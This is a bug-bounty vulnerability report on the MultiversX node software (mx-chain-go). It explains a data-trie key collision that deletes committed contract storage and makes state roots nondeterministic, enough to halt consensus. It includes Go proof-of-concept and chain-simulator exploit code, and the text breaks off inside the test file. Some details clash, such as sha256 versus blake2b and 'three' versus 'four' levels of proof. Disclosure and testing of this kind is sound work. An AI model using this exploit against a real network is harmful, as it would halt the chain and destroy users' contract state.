## multiversx/mx-chain-go
Private audit · Target: [multiversx/mx-chain-go](https://github.com/multiversx/mx-chain-go)

MultiversX is a Go-implemented adaptive-state-sharding L1. This finding is a key collision in the
account data-trie layer. Since the `AutoBalanceDataTries` epoch — active on mainnet since epoch
1265, and mainnet is past epoch 2255 today — data-trie leaves are written at the hashed key
position and legacy raw-position leaves are migrated lazily on first touch. The migration
classifies a leaf by lookup order instead of verifying the leaf actually belongs to the requested
logical key, so a contract that writes `K2 = blake2b(K1)` hijacks K1's committed AutoBalance leaf
through the raw-key fallback and the migration path deletes it. When both keys are written in a
single transaction the committed outcome depends on Go map iteration order, so the same transaction
commits different state roots on different executions — an externally triggered consensus halt —
and committed, publicly queryable storage values are silently destroyed. Confirmed at three levels:
a unit PoC against the real trie, a chain-simulator test in the repo, and an end-to-end run on a
real 8-process local network with live libp2p gossip and BLS multisignature consensus. One plain
transaction from any deployed contract suffices; all testing was local.

- **Audited ref:** master @ `497f0f572aa3`
- **Weakness:** missing ownership check on raw-position leaf classification in the data-trie migration path (improper input validation, CWE-20), plus nondeterministic unsorted flush of `dirtyData`
- **Patched:** none known at time of report (present in master at the audited ref)
- **Disclosure:** privately reported through the MultiversX bug bounty (protocol repo scope)
- **PoC:** unit PoC, chain-simulator test, Rust contract + wasm, tx signer/attack driver and the full regtest transcript with all eight node logs are embedded verbatim in the report appendix; runnable sources under [`poc/`](./poc/) (`multiversx-datatrie-collision-*`)

**Severity — researcher analysis.** Critical. The consensus-integrity path — one transaction whose
committed state root is a function of the executing node's map iteration order, blocking
notarization in a full consensus group, sustainable from the mempool for the cost of gas — is the
same failure category as the September 2026 mainnet incident. The secondary impact is silent,
permanent destruction of committed contract state. Not a direct minting or cross-account theft
primitive: protected `0x00`-prefixed system keys are unreachable (finding a blake2b preimage with
the full protected prefix is ~2^88 work).

---

# Missing version check in the data trie migration path allows any contract to collide storage keys, delete committed state and make the state root of a transaction nondeterministic, which enables an externally triggered consensus halt

## Description

### Brief

The account data trie layer in mx-chain-go decides whether a leaf is an old style raw leaf or a new AutoBalance hashed leaf based only on which lookup happened to find it. It never verifies that a leaf found through the raw key fallback actually belongs to that logical key. A contract can therefore write a storage key K2 that equals blake2b of another key K1, and the write of K2 will be treated as a migration of the leaf that physically sits at position K2, which is K1's committed AutoBalance leaf, and will delete it. On mainnet this needs one plain transaction from any deployed contract, the flag has been active since epoch 1265 and mainnet is at epoch 2255 today. We confirmed two effects on a real local network built from current master. First, a committed and queryable storage value is silently and permanently deleted by an unrelated later write. Second, when both keys are written in one transaction the committed outcome depends on Go map iteration order, so the very same transaction commits different state roots on different executions. In a full consensus group this prevents notarization of any block containing the transaction and one cheap transaction repeated in the mempool halts the chain.

### Vulnerability Details

Since the AutoBalanceDataTries epoch, data trie leaves are written at the hashed position of the key. The logical key and the account address are embedded in the leaf value. Old leaves written before the flag stay at the raw key position and are migrated lazily when they are touched again. The migration logic needs to tell the two apart. It does this by lookup order instead of by verifying the leaf.

The lookup is in `state/trackableDataTrie/trackableDataTrie.go` in `retrieveValueFromTrie`, lines 405 to 451. When the flag is enabled it first tries the hashed position. If that misses it falls back to a raw key lookup.

```go
// state/trackableDataTrie/trackableDataTrie.go:424-439
	}

	valWithMetadata, depth, err := tdt.tr.Get(key)
	if err != nil {
		return core.TrieData{}, 0, err
	}
	tdt.collectReadOperation(key, valWithMetadata, uint32(core.NotSpecified))
	if len(valWithMetadata) != 0 {
		trieValue := core.TrieData{
			Key:     key,
			Value:   valWithMetadata,
			Version: core.NotSpecified,
		}

		return trieValue, depth, nil
	}
```

The problem is that `tdt.tr.Get(key)` resolves by key bytes only. In `trie/patriciaMerkleTrie.go` the Get walks the trie and in `trie/leafNode.go` lines 209 to 219 the match is `bytes.Equal(key, ln.Key)`. The trie has one leaf per physical key regardless of version. So if logical key K2 equals blake2b of logical key K1, and K1 has an AutoBalance leaf at physical position blake2b(K1), then the raw fallback for K2 finds K1's leaf and labels it `core.NotSpecified`, meaning old style legacy. The label is wrong. The leaf value even contains the true original key inside `TrieLeafData.Key`, see `getValueForVersion` at lines 206 to 226 which embeds it on every AutoBalance write, but the fallback never checks it.

The wrong label then drives a delete. In `deleteOldEntryIfMigrated`, lines 482 to 494.

```go
// state/trackableDataTrie/trackableDataTrie.go:487-491
	isMigration := oldEntry.Version == core.NotSpecified && newData.newVersion == core.AutoBalanceEnabled
	if isMigration && len(newData.value) != 0 {
		log.Trace("delete old entry if migrated", "key", key)
		return true, tdt.tr.Delete(key)
	}
```

Because the fallback mislabeled K1's fresh AutoBalance leaf as `NotSpecified`, and the new write is version `AutoBalanceEnabled`, the condition holds and `tdt.tr.Delete(key)` removes whatever leaf is physically at `key`, which is K1's leaf. K1's committed value is gone. The attacker only needs to compute blake2b offline, the node hasher is configured as blake2b in `cmd/node/config/config.toml` under `[Hasher]`.

The same mislabel also breaks determinism when both keys are written in a single transaction. A contract storage write buffers in `dirtyData`, see `SaveKeyValue` at lines 115 to 128, and `vmOutputAccountsProcessor.processStorageUpdatesStep` in `process/smartContract/processorV2/vmOutputAccountsProcessor.go` lines 147 to 163 applies all storage updates of the transaction to the same account wrapper, so both keys land in one flush. The flush loop is at line 281.

```go
// state/trackableDataTrie/trackableDataTrie.go:280-282
	index := 0
	for key, dataEntry := range tdt.dirtyData {
		oldVal, _, err := tdt.retrieveValueFromTrie([]byte(key))
```

`tdt.dirtyData` is a plain Go map and the iteration order is randomized. If K1 is processed first its hashed leaf is written at physical position K2, then K2's raw fallback finds it, mislabels it and deletes it, and the final trie contains only K2's leaf. If K2 is processed first there is no interaction and the final trie contains both leaves. The two orders produce two different tries and two different account root hashes for the same transaction. The function even sorts the deleted keys for its state changes output at lines 379 to 381 with `sort.Slice`, so determinism was considered for that output but not for the flush itself.

Two more effects come from the same root cause. A journal revert can resurrect a written value, because the journal's recorded old value for K2 is the mislabeled leaf and replaying it shadows the restored raw K1 leaf, so a failed transaction can leave its storage write applied. And a read through a collided key can return another key's bytes, because `getValueNotSpecifiedVersion` at lines 490 to 495 trims the value by length only.

Protected keys are not affected. ESDT balance keys and other system keys carry the `0x00` protected prefix, VM storage writes under it are rejected by `IsAllowedToSaveUnderKey` in `process/common.go` at line 752, and finding a blake2b preimage that starts with the full protected prefix is about 2 to the power 88 work. So this is not a direct minting or cross account theft primitive. The damage is to consensus integrity and to the contract's own committed state.

### Impact Details

The primary impact is consensus divergence and network halt. One transaction from any deployed contract makes the committed state root of that transaction a function of Go map iteration order in the executing node. A block proposer computes one root and every verifying node that re executes the block computes its own. With a full consensus group the probability that enough verifiers match the proposer by chance is negligible, the block cannot be notarized, and the round fails. The transaction can be kept in the mempool for the cost of gas, so the halt is sustained and externally triggered by anyone. No node keys, no validator stake and no privileged roles are involved, deployment of a contract and plain transactions are enough. This class is the same failure category as the September 2026 mainnet incident where invalid state changes forced a halt and recovery, and this bug is in a different subsystem and remains present in current master.

The secondary impact is silent destruction of committed state. A value that was committed and publicly queryable through the VM query API becomes unreadable with no error anywhere in the pipeline. Both effects were observed on a real local network as shown below. We did not and will not run any part of this against a public network, all testing was local.

There is no direct loss of third party funds through this path since the collided keys belong to the attacker's own contract and protected system keys cannot be reached. The asset at risk is the integrity and liveness of the chain itself, which we understand falls under the protocol repo scope of the program.

### References

- Vulnerable lookup, `state/trackableDataTrie/trackableDataTrie.go` lines 405 to 451, raw fallback at 426 to 439
- Migration delete, same file, lines 482 to 494
- Unsorted flush loop, same file, line 281, contrast with the sorted output at 379 to 381
- Key hashing helpers, same file, `getKeyForVersion` at 198 to 202 and `getValueForVersion` at 206 to 226
- Storage write buffering, same file, `SaveKeyValue` at 115 to 128
- Version blind trie Get, `trie/patriciaMerkleTrie.go` lines 97 to 113 and `trie/leafNode.go` lines 209 to 219
- Per transaction storage updates, `process/smartContract/processorV2/vmOutputAccountsProcessor.go` lines 147 to 163
- Protected key enforcement, `process/common.go` line 752
- All code references are against master commit 497f0f572aa3 which was the tip of master at the time of writing
- Flag activation on mainnet, live gateway endpoint `gateway.multiversx.com/network/enable-epochs` reports `erd_auto_balance_data_tries_enable_epoch = 1265` and `gateway.multiversx.com/network/status/0` reports `erd_epoch_number = 2255`
- Node hasher configuration, `cmd/node/config/config.toml` section `[Hasher]` with `Type = "blake2b"`

## Proof of Concept

We confirmed the bug at four levels, a unit test against the real trie code, an in process chain simulator test, and an end to end run on a real local node network built from source. Everything ran locally, nothing was broadcast to any public network.

### Level 1, unit PoC against the real trie

A small Go program drives the real `trackableDataTrie` and the real patricia trie from the repo, no mocks except the epoch flag stubs. It writes K1 while the flag is off to emulate a legacy leaf, then in one batch writes both K1 and K2 where K2 is the hash of K1, and repeats 20 times on fresh tries. The committed root hash differs across identical runs.

```
=== distinct committed-state outcomes across identical executions ===
  18 x  K2leafPresent=false root=2dbb4b2f071e6b926fc716a60d4da8553949520f9f8d476bdb7f77b4a461a223
   2 x  K2leafPresent=true  root=315043ed6fc150621ff18c874b4b51f37c4cd1decd328abd5fe4a2ecaaf76d90
```

The same program replays the journal revert and reads K1 afterwards.

```
post-revert read of K1: "NEW V1 value" (expected "old V1 value")
```

Source is in `security-research/unit-poc/main.go` and `revert.go`.

### Level 2, chain simulator test in the repo

Two tests were added at `integrationTests/chainSimulator/dataTrieCollision/dataTrieCollision_test.go` with the test contract at `testdata/store2.wasm` and its Rust source at `testdata/store2src/`. The contract is a 472 byte no_std module using the VM managed buffer API with three endpoints, `store1(k, v)`, `store2(k1, v1, k2, v2)` and `load1(k)`, it is just raw storage writes.

`TestChainSimulator_DataTrieKeyCollision_DeterministicKeyDestruction` stores K1 in one transaction, reads it back, stores K2 equal to blake2b of K1 in a second transaction and reads K1 again.

```
K1 value after storing K1:            "value stored under K1"
K1 value after storing K2=blake2b(K1): ""
K2 value after storing K2=blake2b(K1): "value stored under K2"
```

`TestChainSimulator_DataTrieKeyCollision_NondeterministicStateRoot` runs 60 byte identical single transactions of `store2` into fresh contracts and asserts more than one distinct committed semantic outcome.

```
first occurrence of outcome "K1read=\"\"" at round 1 (contract root hash: bdfeb8e0209555de7dc2d3e53c5b7914519c9049b3cf1238692f0781e028a551)
first occurrence of outcome "K1read=\"v1\"" at round 5 (contract root hash: baee56f2c2c2c330c5c17c9f7fef90995ceb91daa9eeba8c438f2361d8855c5c)
round 60/60: distinct outcomes so far: 2
```

Run them with the following from the repo root.

```bash
go test -count=1 -v ./integrationTests/chainSimulator/dataTrieCollision/ -timeout 30m
```

Both tests pass on unmodified source, the only repo additions are the test files themselves.

### Level 3, end to end on a real local node network

We built the actual node and seednode binaries from master with the repo's own scripts, verified with `go version -m` that the binary is `github.com/multiversx/mx-chain-go/cmd/node` at commit 497f0f572aa3, and ran 8 independent processes, one seednode, three shard 0 validators, three metachain validators and two observers, with real libp2p gossip, real BLS multisignature consensus committing blocks every round and the REST API enabled. The chain used `AutoBalanceDataTriesEnableEpoch = 1` so the vulnerable path was active. The attacker wallet was funded from genesis with about 19.98M eGLD and all transactions were signed ed25519 over `GetDataForSigning` and submitted through the node REST API, so the full production validation path was exercised including signature checks, nonce, gas, mempool, block inclusion, consensus and execution.

Deterministic destruction, contract `erd1qqqqqqqqqqqqqpgqa4kyss2sxp8e5w95a6u6wr4m76fans09fg4qnh4j29`.

```
store1(K1, "value stored under K1")  -> executed, VM query load1(K1) returns 76616c75652073746f72656420756e646572204b31
store1(K2 = blake2b(K1), ...)        -> executed in block nonce 28, root hash f974c92894937d2f443a0ba5e9b5ae56f8c6f22e10f4d45d92f2aa1a8718b588
VM query load1(K1) after             -> data ""
VM query load1(K2) after             -> data "value stored under K2"
```

The K1 hex is 64657465726d696e69737469632d6b65792d30303031 and K2 is 4cf815852db3e7fd2a0d937662f1363ebcfa38cee91bd0d8d7f6296e21b03555. On an earlier identical run of the same network setup the individual transaction hashes were 350b345b98b9e99c6c6e5ac4ddbbf1af565712e8737c0bafcf9fe4db0c606a93 for the first store1 and c8ffb145e87155c0e1659929e06ab90bad389496802f78f9c648bc42cdf2b0d8 for the second.

Nondeterministic committed state. Nine valid rounds of one byte identical transaction, `store2(K1, "v1", K2 = blake2b(K1), "v2")` into a fresh contract each round.

```
round 1: erd1qqqqqqqqqqqqqpgqg7p6mxlu07gsw33rtkzt5rqjln40zsmafg4qq6nmrn -> K1b INTACT
round 2: erd1qqqqqqqqqqqqqpgqx9qhgl9j3krfmk2uhm3yx6hpdrlfw8x4fg4qvv8q7a -> K1b DESTROYED
round 3: erd1qqqqqqqqqqqqqpgqlyvhd36mv33qsqh4hdvd22qyqqw6c36mfg4qen5hza -> K1b DESTROYED
round 4: erd1qqqqqqqqqqqqqpgq694f82tfmcv8267t77paagxtdqfj7audfg4q5yz2c5 -> K1b DESTROYED
round 5: erd1qqqqqqqqqqqqqpgqqzzkmcfjrhnh857x0xntxrslp2fyuugxfg4qmpnlmt -> K1b DESTROYED
round 6: erd1qqqqqqqqqqqqqpgql6kmzc4n5pmqsdrtekgnkx4ek4ml6cqzfg4qcz4nsn -> K1b DESTROYED
round 7: erd1qqqqqqqqqqqqqpgqjnda8gsjy9npc35mtpfkpxy5gtf7la4tfg4q6rq2vr -> K1b DESTROYED
round 8: erd1qqqqqqqqqqqqqpgqfhza7u08k4c879f6rs2l6kym2k3356djfg4q49eup2 -> K1b DESTROYED
round 9: erd1qqqqqqqqqqqqqpgq99yrgfntrrkkfy2yrfdhncc8v93dfpdffg4qjftu2z -> K1b DESTROYED
```

INTACT means the VM query of K1b returns "v1", DESTROYED means it returns empty. We then read the account root hash of two of these contracts from all four nodes, the observer on port 10000 and the three shard validators on ports 9503, 9504 and 9505.

```
round 2 contract, DESTROYED outcome, all 4 nodes report rootHash aJ90LArffxtM6kSi4ueU...
round 1 contract, INTACT outcome,   all 4 nodes report rootHash 6BXlpZnyzFro7RH6rhYB...
```

All nodes agree within each round because consensus followed the outcome the proposer computed. The chain has committed two different state transition outcomes for the same transaction and the choice was made by the proposer's in process map iteration order. In a shard with a full consensus group the verifiers' independently recomputed roots disagree with the proposer for this transaction, which blocks notarization.

The full transcript, the complete node logs of all eight processes, the transaction signer, the attack driver and every source file mentioned in this report are embedded verbatim in the Appendix below, so this document alone is sufficient to reproduce and verify all three levels. The driver reproduces the whole sequence against a running local network.

```bash
bash security-research/regtools/attack_driver.sh
```

### Suggested fix

Two independent changes each break the demonstrated attacks. First, make the raw fallback verify the leaf it found. AutoBalance leaf values already embed the original key in `TrieLeafData.Key`, so on a raw position hit the code should unmarshal and compare `TrieLeafData.Key` with the requested key before classifying the leaf as legacy, and never delete when they differ. Second, make `updateTrie` deterministic by iterating `dirtyData` in sorted key order, the same discipline already applied to `deletedKeys` at lines 379 to 381. The first change removes the false migration delete and the second removes the order dependence even if other classification issues remain.

## Appendix, full source code and evidence

Everything referenced in the Proof of Concept is embedded below so this document is self contained. The only artifact that cannot be pasted as text is the compiled wasm binary, it is included as base64 together with the command to rebuild the file.

### A 1, unit PoC module definition


### A 1, unit PoC go.mod

File `security-research/unit-poc/go.mod`.

```text
module collideproof

go 1.26

require (
	github.com/multiversx/mx-chain-core-go v1.5.1
	github.com/multiversx/mx-chain-go v0.0.0
)

require (
	github.com/beevik/ntp v1.3.0 // indirect
	github.com/btcsuite/btcd/btcutil v1.2.0 // indirect
	github.com/bytedance/gopkg v0.1.3 // indirect
	github.com/bytedance/sonic v1.15.0 // indirect
	github.com/bytedance/sonic/loader v0.5.0 // indirect
	github.com/cloudwego/base64x v0.1.6 // indirect
	github.com/denisbrodbeck/machineid v1.0.1 // indirect
	github.com/gabriel-vasile/mimetype v1.4.13 // indirect
	github.com/gin-contrib/sse v1.1.0 // indirect
	github.com/gin-gonic/gin v1.12.0 // indirect
	github.com/go-ole/go-ole v1.2.6 // indirect
	github.com/go-playground/locales v0.14.1 // indirect
	github.com/go-playground/universal-translator v0.18.1 // indirect
	github.com/go-playground/validator/v10 v10.30.1 // indirect
	github.com/goccy/go-json v0.10.5 // indirect
	github.com/goccy/go-yaml v1.19.2 // indirect
	github.com/gogo/protobuf v1.3.2 // indirect
	github.com/golang/protobuf v1.5.4 // indirect
	github.com/golang/snappy v0.0.5-0.20231225225746-43d5d4cd4e0e // indirect
	github.com/hashicorp/golang-lru v1.0.2 // indirect
	github.com/json-iterator/go v1.1.12 // indirect
	github.com/klauspost/cpuid/v2 v2.4.0 // indirect
	github.com/leodido/go-urn v1.4.0 // indirect
	github.com/mattn/go-isatty v0.0.22 // indirect
	github.com/modern-go/concurrent v0.0.0-20180306012644-bacd9c7ef1dd // indirect
	github.com/modern-go/reflect2 v1.0.2 // indirect
	github.com/mr-tron/base58 v1.3.0 // indirect
	github.com/multiversx/concurrent-map v0.1.4 // indirect
	github.com/multiversx/mx-chain-communication-go v1.4.1 // indirect
	github.com/multiversx/mx-chain-crypto-go v1.3.3 // indirect
	github.com/multiversx/mx-chain-logger-go v1.2.0 // indirect
	github.com/multiversx/mx-chain-storage-go v1.2.0 // indirect
	github.com/multiversx/mx-chain-vm-common-go v1.7.2 // indirect
	github.com/pelletier/go-toml v1.9.5 // indirect
	github.com/pelletier/go-toml/v2 v2.2.4 // indirect
	github.com/quic-go/qpack v0.6.0 // indirect
	github.com/quic-go/quic-go v0.59.1 // indirect
	github.com/shirou/gopsutil v3.21.11+incompatible // indirect
	github.com/syndtr/goleveldb v1.0.1-0.20220721030215-126854af5e6d // indirect
	github.com/tklauser/go-sysconf v0.3.12 // indirect
	github.com/tklauser/numcpus v0.6.1 // indirect
	github.com/twitchyliquid64/golang-asm v0.15.1 // indirect
	github.com/ugorji/go/codec v1.3.1 // indirect
	github.com/yusufpapurcu/wmi v1.2.4 // indirect
	go.mongodb.org/mongo-driver/v2 v2.5.0 // indirect
	golang.org/x/arch v0.23.0 // indirect
	golang.org/x/crypto v0.54.0 // indirect
	golang.org/x/net v0.56.0 // indirect
	golang.org/x/sync v0.22.0 // indirect
	golang.org/x/sys v0.47.0 // indirect
	golang.org/x/text v0.40.0 // indirect
	google.golang.org/protobuf v1.36.11 // indirect
)

replace github.com/multiversx/mx-chain-go => /Users/antics/Documents/mx-chain-go
```

### A 2, unit PoC main

File `security-research/unit-poc/main.go`.

```go
package main

import (
	"fmt"

	"github.com/multiversx/mx-chain-core-go/core"
	"github.com/multiversx/mx-chain-core-go/hashing/sha256"
	"github.com/multiversx/mx-chain-core-go/marshal"
	"github.com/multiversx/mx-chain-go/common"
	"github.com/multiversx/mx-chain-go/state/trackableDataTrie"
	"github.com/multiversx/mx-chain-go/testscommon/enableEpochsHandlerMock"
	stateMock "github.com/multiversx/mx-chain-go/testscommon/state"
	"github.com/multiversx/mx-chain-go/testscommon/storageManager"
	"github.com/multiversx/mx-chain-go/trie"
)

// replicates AccountsDB SaveAccount -> saveDataTrie -> SaveDirtyData on a shared real trie
func runOnce(iter int) (rootK2 bool, rootHashes string, err error) {
	flagOn := &enableEpochsHandlerMock.EnableEpochsHandlerStub{
		IsFlagEnabledCalled: func(flag core.EnableEpochFlag) bool {
			return flag == common.AutoBalanceDataTriesFlag
		},
	}
	flagOff := &enableEpochsHandlerMock.EnableEpochsHandlerStub{
		IsFlagEnabledCalled: func(flag core.EnableEpochFlag) bool {
			return false
		},
	}

	hasher := sha256.NewSha256()
	marshaller := &marshal.JsonMarshalizer{}

	realTrie, err := trie.NewTrie(&storageManager.StorageManagerStub{}, marshaller, hasher, flagOn, 60)
	if err != nil {
		return false, "", err
	}

	addr := []byte("account_addr_32_bytes__________")
	K1 := []byte("attacker storage key no 1")
	V1old := []byte("old V1 value")
	V1new := []byte("NEW V1 value")
	V2 := []byte("value stored under K2")

	K2 := hasher.Compute(string(K1)) // sha256(K1)

	// phase 1: pre-flag write of raw K1 (legacy, NotSpecified version)
	tdt1, _ := trackableDataTrie.NewTrackableDataTrie(addr, hasher, marshaller, flagOff, &stateMock.StateAccessesCollectorStub{})
	tdt1.SetDataTrie(realTrie)
	if err := tdt1.SaveKeyValue(K1, V1old); err != nil {
		return false, "", err
	}
	if _, _, err := tdt1.SaveDirtyData(realTrie); err != nil {
		return false, "", err
	}

	// sanity: raw entry present pre-flag
	got, _, _ := realTrie.Get(K1)
	fmt.Printf("iter %d: pre-flag raw K1 present: %v\n", iter, string(got) != "")

	// phase 2: post-flag tx writing BOTH K1 and K2=sha256(K1) in one batch
	tdt2, _ := trackableDataTrie.NewTrackableDataTrie(addr, hasher, marshaller, flagOn, &stateMock.StateAccessesCollectorStub{})
	tdt2.SetDataTrie(realTrie)
	_ = tdt2.SaveKeyValue(K1, V1new)
	_ = tdt2.SaveKeyValue(K2, V2)
	if _, _, err := tdt2.SaveDirtyData(realTrie); err != nil {
		return false, "", err
	}

	// inspect final committed trie
	v2Leaf, _, _ := realTrie.Get(K2)
	k2Present := len(v2Leaf) != 0
	rh, _ := realTrie.RootHash()
	return k2Present, fmt.Sprintf("%x", rh), nil
}

func main() {
	runRevertCase()
	outcomes := map[string]int{}
	for i := 0; i < 20; i++ {
		k2present, rh, err := runOnce(i)
		if err != nil {
			fmt.Println("ERR:", err)
			return
		}
		outcome := fmt.Sprintf("K2leafPresent=%v root=%s", k2present, rh)
		outcomes[outcome]++
	}
	fmt.Println("\n=== distinct committed-state outcomes across identical executions ===")
	for o, n := range outcomes {
		fmt.Printf("%4d x  %s\n", n, o)
	}
}
```

### A 3, unit PoC revert case

File `security-research/unit-poc/revert.go`.

```go
package main

import (
	"fmt"

	"github.com/multiversx/mx-chain-core-go/core"
	"github.com/multiversx/mx-chain-core-go/hashing/sha256"
	"github.com/multiversx/mx-chain-core-go/marshal"
	"github.com/multiversx/mx-chain-go/common"
	"github.com/multiversx/mx-chain-go/state/trackableDataTrie"
	"github.com/multiversx/mx-chain-go/testscommon/enableEpochsHandlerMock"
	stateMock "github.com/multiversx/mx-chain-go/testscommon/state"
	"github.com/multiversx/mx-chain-go/testscommon/storageManager"
	"github.com/multiversx/mx-chain-go/trie"
)

func runRevertCase() {
	flagOn := &enableEpochsHandlerMock.EnableEpochsHandlerStub{
		IsFlagEnabledCalled: func(flag core.EnableEpochFlag) bool {
			return flag == common.AutoBalanceDataTriesFlag
		},
	}
	flagOff := &enableEpochsHandlerMock.EnableEpochsHandlerStub{
		IsFlagEnabledCalled: func(flag core.EnableEpochFlag) bool { return false },
	}
	hasher := sha256.NewSha256()
	marshaller := &marshal.JsonMarshalizer{}
	realTrie, _ := trie.NewTrie(&storageManager.StorageManagerStub{}, marshaller, hasher, flagOn, 60)

	addr := []byte("account_addr_32_bytes__________")
	K1 := []byte("attacker storage key no 1")
	V1old := []byte("old V1 value")
	V1new := []byte("NEW V1 value")
	V2 := []byte("value under K2")
	K2 := hasher.Compute(string(K1))

	tdt1, _ := trackableDataTrie.NewTrackableDataTrie(addr, hasher, marshaller, flagOff, &stateMock.StateAccessesCollectorStub{})
	tdt1.SetDataTrie(realTrie)
	_ = tdt1.SaveKeyValue(K1, V1old)
	_, _, _ = tdt1.SaveDirtyData(realTrie)

	tdt2, _ := trackableDataTrie.NewTrackableDataTrie(addr, hasher, marshaller, flagOn, &stateMock.StateAccessesCollectorStub{})
	tdt2.SetDataTrie(realTrie)
	_ = tdt2.SaveKeyValue(K1, V1new)
	_ = tdt2.SaveKeyValue(K2, V2)
	_, oldValues, _ := tdt2.SaveDirtyData(realTrie)

	// journalEntryDataTrieUpdates.Revert:
	for i := len(oldValues) - 1; i >= 0; i-- {
		u := oldValues[i]
		dtr := realTrie
		_ = dtr.UpdateWithVersion(u.Key, u.Value, u.Version)
	}

	// post-revert: what does a subsequent tx READ for K1?
	tdt3, _ := trackableDataTrie.NewTrackableDataTrie(addr, hasher, marshaller, flagOn, &stateMock.StateAccessesCollectorStub{})
	tdt3.SetDataTrie(realTrie)
	v1After, _, _ := tdt3.RetrieveValue(K1)
	fmt.Printf("post-revert read of K1: %q (expected %q)\n", string(v1After), V1old)
}
```


### B, chain simulator test, contract source and binary


### B 1, chain simulator test file

File `integrationTests/chainSimulator/dataTrieCollision/dataTrieCollision_test.go`.

```go
package dataTrieCollision

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"testing"

	"github.com/multiversx/mx-chain-core-go/core"
	coreAPI "github.com/multiversx/mx-chain-core-go/data/api"
	"github.com/multiversx/mx-chain-core-go/hashing/blake2b"
	"github.com/multiversx/mx-chain-core-go/hashing/keccak"
	"github.com/stretchr/testify/require"

	testsChainSimulator "github.com/multiversx/mx-chain-go/integrationTests/chainSimulator"
	"github.com/multiversx/mx-chain-go/node/chainSimulator"
	"github.com/multiversx/mx-chain-go/node/chainSimulator/components/api"
	"github.com/multiversx/mx-chain-go/node/chainSimulator/dtos"
	"github.com/multiversx/mx-chain-go/process"
	"github.com/multiversx/mx-chain-go/process/factory"
)

const (
	pathToInitialConfig = "../../../cmd/node/config/"
	pathToWasm          = "testdata/store2.wasm"

	deployGasLimit = 100_000_000
	callGasLimit   = 50_000_000

	// AutoBalanceDataTriesEnableEpoch is 1 in the default config this simulator uses
	autoBalanceActivationEpoch = 1
)

var oneEGLD = big.NewInt(1000000000000000000)

// computeSCAddress replicates blockChainHookImpl.NewAddress for the wasm VM:
// keccak256(creator || littleEndian64(nonce)) with the 10-byte prefix mask (8 zeros + vmType)
// and the 2-byte shard suffix mask taken from the creator.
func computeSCAddress(creator []byte, nonce uint64) []byte {
	buffNonce := make([]byte, 8)
	binary.LittleEndian.PutUint64(buffNonce, nonce)
	adrAndNonce := append(creator, buffNonce...)
	base := keccak.NewKeccak().Compute(string(adrAndNonce))

	copy(base[:core.NumInitCharactersForScAddress-core.VMTypeLen], make([]byte, core.NumInitCharactersForScAddress-core.VMTypeLen))
	copy(base[core.NumInitCharactersForScAddress-core.VMTypeLen:core.NumInitCharactersForScAddress], factory.WasmVirtualMachine)
	copy(base[len(base)-core.ShardIdentiferLen:], creator[len(creator)-core.ShardIdentiferLen:])

	return base
}

func startSimulator(t *testing.T) testsChainSimulator.ChainSimulator {
	cs, err := chainSimulator.NewChainSimulator(chainSimulator.ArgsChainSimulator{
		BypassTxSignatureCheck:         true,
		TempDir:                        t.TempDir(),
		PathToInitialConfig:            pathToInitialConfig,
		NumOfShards:                    1,
		RoundDurationInMillis:          6000,
		SupernovaRoundDurationInMillis: 600,
		RoundsPerEpoch: core.OptionalUint64{
			HasValue: true,
			Value:    20,
		},
		SupernovaRoundsPerEpoch: core.OptionalUint64{
			HasValue: true,
			Value:    20,
		},
		ApiInterface:           api.NewNoApiInterface(),
		MinNodesPerShard:       3,
		MetaChainMinNodes:      3,
		NumNodesWaitingListMeta: 0,
	})
	require.Nil(t, err)
	require.NotNil(t, cs)

	// advance past the AutoBalanceDataTries activation epoch so all new writes are hashed-key writes
	err = cs.GenerateBlocksUntilEpochIsReached(int32(autoBalanceActivationEpoch))
	require.Nil(t, err)

	return cs
}

func deployStore2(t *testing.T, cs testsChainSimulator.ChainSimulator, wallet dtos.WalletAddress, nonce *uint64) []byte {
	code, err := os.ReadFile(pathToWasm)
	require.Nil(t, err)

	deployData := hex.EncodeToString(code) + "@" + hex.EncodeToString(factory.WasmVirtualMachine) + "@0102"
	tx := testsChainSimulator.GenerateTransaction(wallet.Bytes, *nonce, make([]byte, 32), big.NewInt(0), deployData, deployGasLimit)
	scAddress := computeSCAddress(wallet.Bytes, *nonce)
	*nonce++

	res, err := cs.SendTxAndGenerateBlockTilTxIsExecuted(tx, 7)
	require.Nil(t, err)
	require.NotNil(t, res)
	require.Equal(t, "success", res.Status.String())

	node := cs.GetNodeHandler(0)
	computedBech32, _ := node.GetCoreComponents().AddressPubKeyConverter().Encode(scAddress)
	t.Logf("deploy status=%s message=%q receiver=%s computed=%s", res.Status, res.ReturnMessage, res.Receiver, computedBech32)
	return scAddress
}

func callStore(t *testing.T, cs testsChainSimulator.ChainSimulator, wallet dtos.WalletAddress, nonce *uint64, scAddress []byte, function string, args ...[]byte) {
	data := function
	for _, arg := range args {
		data += "@" + hex.EncodeToString(arg)
	}

	tx := testsChainSimulator.GenerateTransaction(wallet.Bytes, *nonce, scAddress, big.NewInt(0), data, callGasLimit)
	*nonce++

	res, err := cs.SendTxAndGenerateBlockTilTxIsExecuted(tx, 7)
	require.Nil(t, err)
	require.NotNil(t, res)
	require.Equal(t, "success", res.Status.String())
}

func queryLoad(t *testing.T, cs testsChainSimulator.ChainSimulator, scAddress []byte, key []byte) []byte {
	node := cs.GetNodeHandler(0)
	res, _, err := node.GetFacadeHandler().ExecuteSCQuery(&process.SCQuery{
		ScAddress:   scAddress,
		FuncName:    "load1",
		Arguments:   [][]byte{key},
		CallerAddr:  nil,
		BlockNonce:  core.OptionalUint64{},
	})
	require.Nil(t, err)
	require.NotNil(t, res)
	require.Equal(t, "ok", res.ReturnCode)

	if len(res.ReturnData) == 0 {
		return nil
	}
	if len(res.ReturnData[0]) == 0 {
		return nil
	}
	return res.ReturnData[0]
}

func accountRootHash(t *testing.T, cs testsChainSimulator.ChainSimulator, scAddress []byte) string {
	// returns the hex-encoded data trie root hash of the account
	node := cs.GetNodeHandler(0)
	bech32, err := node.GetCoreComponents().AddressPubKeyConverter().Encode(scAddress)
	require.Nil(t, err)
	acc, _, err := node.GetFacadeHandler().GetAccount(bech32, coreAPI.AccountQueryOptions{})
	require.Nil(t, err)
	require.NotNil(t, acc)
	return hex.EncodeToString(acc.RootHash)
}

// TestChainSimulator_DataTrieKeyCollision_DeterministicKeyDestruction shows that a smart
// contract writing key K2 = sha256(K1) permanently deletes the already-committed value stored
// under K1: the raw-key fallback lookup in trackableDataTrie.retrieveValueFromTrie is version
// blind, so K2's write finds K1's hashed (AutoBalance) leaf at the physical position sha256(K1)=K2,
// mislabels it as a legacy NotSpecified leaf, and the migration path deletes it.
